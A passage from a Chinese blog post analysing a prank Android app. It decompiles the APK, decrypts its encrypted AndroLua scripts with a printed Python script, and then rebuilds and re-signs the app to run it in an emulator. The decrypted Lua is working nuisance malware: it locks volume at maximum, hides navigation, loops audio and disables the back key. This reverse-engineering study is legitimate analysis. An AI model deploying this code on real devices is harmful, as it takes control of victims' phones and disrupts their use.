<li><p>将前面解压出来的 class.dex 文件放入 dex2jar 工具里进行反编译成 Java 源码</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">d2j-dex2jar.bat classes.dex<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114203256661.png" alt="image-20241114203256661"></p>
</li>
<li><p>使用 jd-gui 对Java源码进行分析</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114204253812.png" alt="image-20241114204253812"></p>
<p>大部分代码均来自于AndroLua_pro，AndroLua_pro 是一个使用 Lua 编写 Android 应用的项目，换而言之，Java部分极有可能并不是应用的主体部分，重要操作很有可能会写在Lua</p>
<p>除了AndroLua_pro的代码外，我们还发现了com.b.a.a、com.b.a.b 这两个经过混淆的包名，经过查证得知里面的代码来源 TextWarrior</p>
</li>
<li><p>那么还是把重点放在分析 Lua 脚本，打开 assets 下的 init.lua 和 main.lua 发现全是乱码也不是字节码，应该是被加密了</p>
<p>找一下加载 lua 脚本的地方</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114212350288.png" alt="image-20241114212350288"></p>
<p>跟踪这里的 luaState 类</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114212445087.png" alt="image-20241114212445087"></p>
<p>引入了一个 lib 库，可知加密使用的是 &#x2F;lib&#x2F;armeabli-v7a&#x2F;libluajava.so</p>
<p>使用 ida 逆向这个 so 文件，找 luaState 类里面的方法对应的函数</p>
<p>在 luaL.loadbufferx 函数中发现解密的过程</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114212817929.png" alt="image-20241114212817929"></p>
<p>用 pcat 大佬的解密脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf8 -*-</span>
__author__<span class="token operator">=</span><span class="token string">'pcat@chamd5.org'</span>
__blog__<span class="token operator">=</span><span class="token string">'http://pcat.cc'</span>

<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    outfile<span class="token operator">=</span><span class="token string">'init_out.lua'</span>
    <span class="token keyword">if</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x1b</span><span class="token punctuation">)</span> <span class="token keyword">and</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x4c</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        rst<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x1b</span><span class="token punctuation">)</span>
        size<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
        v10<span class="token operator">=</span><span class="token number">0</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
            v10<span class="token operator">+=</span>size
            v<span class="token operator">=</span><span class="token punctuation">(</span>c_ulonglong<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2139062143</span><span class="token operator">*</span>v10<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">+</span>v10
            v1<span class="token operator">=</span>c_uint<span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">7</span>
            v2<span class="token operator">=</span>c_int<span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token operator">&lt;</span><span class="token number">0</span>
            rst<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v10<span class="token operator">+</span>v1<span class="token operator">+</span>v2<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>outfile<span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>rst<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>
        filename<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>    
        filename<span class="token operator">=</span><span class="token string">'init.lua'</span>
    decrypt<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    foo<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>解密后的 lua 文件：</p>
<p>init.lua</p>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> L0_0
appname <span class="token operator">=</span> <span class="token string">"\233\128\129\231\187\153\230\156\128\229\165\189\231\154\132TA"</span>
appver <span class="token operator">=</span> <span class="token string">"1.0"</span>
appcode <span class="token operator">=</span> <span class="token string">"10"</span>
appsdk <span class="token operator">=</span> <span class="token string">"15"</span>
path_pattern <span class="token operator">=</span> <span class="token string">""</span>
packagename <span class="token operator">=</span> <span class="token string">"com.sgzh.dt"</span>
theme <span class="token operator">=</span> <span class="token string">"Theme_DeviceDefault_Dialog_NoActionBar_MinWidth"</span>
app_key <span class="token operator">=</span> <span class="token string">""</span>
app_channel <span class="token operator">=</span> <span class="token string">""</span>
developer <span class="token operator">=</span> <span class="token string">""</span>
description <span class="token operator">=</span> <span class="token string">""</span>
debugmode <span class="token operator">=</span> <span class="token keyword">false</span>
L0_0 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token string">"INTERNET"</span><span class="token punctuation">,</span>
  <span class="token string">"WRITE_EXTERNAL_STORAGE"</span>
<span class="token punctuation">&#125;</span>
user_permission <span class="token operator">=</span> L0_0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>main.lua</p>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"import"</span><span class="token punctuation">)</span>
<span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.app.*"</span><span class="token punctuation">)</span>
<span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.os.*"</span><span class="token punctuation">)</span>
<span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.widget.*"</span><span class="token punctuation">)</span>
<span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.view.*"</span><span class="token punctuation">)</span>
<span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.view.View"</span><span class="token punctuation">)</span>
<span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.content.Context"</span><span class="token punctuation">)</span>
<span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.media.MediaPlayer"</span><span class="token punctuation">)</span>
<span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"android.media.AudioManager"</span><span class="token punctuation">)</span>
<span class="token function">import</span><span class="token punctuation">(</span><span class="token string">"com.androlua.Ticker"</span><span class="token punctuation">)</span>
activity<span class="token punctuation">.</span><span class="token function">getSystemService</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>AUDIO_SERVICE<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setStreamVolume</span><span class="token punctuation">(</span>AudioManager<span class="token punctuation">.</span>STREAM_MUSIC<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> AudioManager<span class="token punctuation">.</span>FLAG_SHOW_UI<span class="token punctuation">)</span>
activity<span class="token punctuation">.</span><span class="token function">getDecorView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setSystemUiVisibility</span><span class="token punctuation">(</span>View<span class="token punctuation">.</span>SYSTEM_UI_FLAG_HIDE_NAVIGATION <span class="token operator">|</span> View<span class="token punctuation">.</span>SYSTEM_UI_FLAG_IMMERSIVE<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token function">MediaPlayer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
m<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
m<span class="token punctuation">.</span><span class="token function">setDataSource</span><span class="token punctuation">(</span>activity<span class="token punctuation">.</span><span class="token function">getLuaDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">..</span> <span class="token string">"/0.mp3"</span><span class="token punctuation">)</span>
m<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
m<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
m<span class="token punctuation">.</span><span class="token function">setLooping</span><span class="token punctuation">(</span><span class="token keyword">true</span><span class="token punctuation">)</span>
ti <span class="token operator">=</span> <span class="token function">Ticker</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
ti<span class="token punctuation">.</span>Period <span class="token operator">=</span> <span class="token number">10</span>
<span class="token keyword">function</span> ti<span class="token punctuation">.</span><span class="token function">onTick</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  activity<span class="token punctuation">.</span><span class="token function">getSystemService</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>AUDIO_SERVICE<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setStreamVolume</span><span class="token punctuation">(</span>AudioManager<span class="token punctuation">.</span>STREAM_MUSIC<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> AudioManager<span class="token punctuation">.</span>FLAG_SHOW_UI<span class="token punctuation">)</span>
  activity<span class="token punctuation">.</span><span class="token function">getDecorView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setSystemUiVisibility</span><span class="token punctuation">(</span>View<span class="token punctuation">.</span>SYSTEM_UI_FLAG_HIDE_NAVIGATION <span class="token operator">|</span> View<span class="token punctuation">.</span>SYSTEM_UI_FLAG_IMMERSIVE<span class="token punctuation">)</span>
<span class="token keyword">end</span>
ti<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">function</span> <span class="token function">onKeyDown</span><span class="token punctuation">(</span>A0_0<span class="token punctuation">,</span> A1_1<span class="token punctuation">)</span>
  <span class="token keyword">if</span> string<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">tostring</span><span class="token punctuation">(</span>A1_1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"KEYCODE_BACK"</span><span class="token punctuation">)</span> <span class="token operator">~=</span> <span class="token keyword">nil</span> <span class="token keyword">then</span>
    activity<span class="token punctuation">.</span><span class="token function">getSystemService</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>AUDIO_SERVICE<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setStreamVolume</span><span class="token punctuation">(</span>AudioManager<span class="token punctuation">.</span>STREAM_MUSIC<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> AudioManager<span class="token punctuation">.</span>FLAG_SHOW_UI<span class="token punctuation">)</span>
  <span class="token keyword">end</span>
  <span class="token keyword">return</span> <span class="token keyword">true</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>具体的操作有以下内容</p>
<ol>
<li><p>将系统音量调至最大</p>
</li>
<li><p>隐藏系统导航栏，并进入沉浸模式（全屏）</p>
</li>
<li><p>每10tick，重复以上步骤使得无法主动调低音量</p>
</li>
<li><p>循环播放音频文件0.mp3</p>
</li>
<li><p>阻止使用返回键</p>
</li>
</ol>
</li>
<li><p>使用 apktool 将改文件夹进行回编译生成新的病毒文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> apktool_2.10.0.jar b 一份礼物<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>windows下由于中文路径的原因报错了，这里选用wsl</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114214407985.png" alt="image-20241114214407985"></p>
</li>
<li><p>将新的 test.apk 文件用 auto-sign 工具进行签名</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> signapk.jar testkey.x509.pem testkey.pk8 test.apk 送给最好的TA.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>安装 送给最好的TA.apk 到模拟器并启动</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114214837231.png" alt="image-20241114214837231"></p>
<p>一阵强劲的音乐响起，似乎是一首很新的歌蕉</p>
</li>
</ol>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>